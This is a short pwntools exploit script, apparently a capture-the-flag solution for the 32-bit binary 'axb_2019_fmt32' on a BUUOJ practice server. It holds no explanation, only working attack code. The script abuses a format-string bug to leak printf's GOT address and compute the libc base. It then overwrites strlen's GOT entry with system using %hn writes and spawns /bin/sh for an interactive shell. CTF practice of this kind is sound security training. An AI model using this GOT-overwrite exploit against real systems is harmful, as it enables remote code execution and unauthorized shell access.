from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23-32/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-32.so"
# p = process([ld_path, "./axb"], env={"LD_PRELOAD":libc_path})
# p = process("./axb_2019_fmt32")
p = remote("node4.buuoj.cn", 25251)
pro = ELF("./axb_2019_fmt32")
libc = ELF(libc_path)


printf_g = pro.got["printf"]
strlen_g = pro.got["strlen"]
offset = 8


# leak
p.recv()
pad = b"a"+p32(printf_g)+b"%8$s"
p.send(pad)
info = u32(p.recvuntil("\xf7")[-4:])
print("leak: ", hex(info))

# count
base = info-libc.sym["printf"]
print(hex(libc.sym["printf"]))
print("base: ", hex(base))
system = base+libc.sym["system"]

# attack
low_sys = system & 0xffff
high_sys = (system >> 16) & 0xffff
print(hex(high_sys), hex(low_sys))
pad = b"a"+p32(strlen_g)+p32(strlen_g+2)
pad += "%{}c%{}$hn".format(low_sys-9-9, offset).encode("ISO-8859-1")
pad += "%{}c%{}$hn".format(high_sys-low_sys, offset+1).encode("ISO-8859-1")

p.send(pad)
p.send(";/bin/sh\x00")

p.interactive()


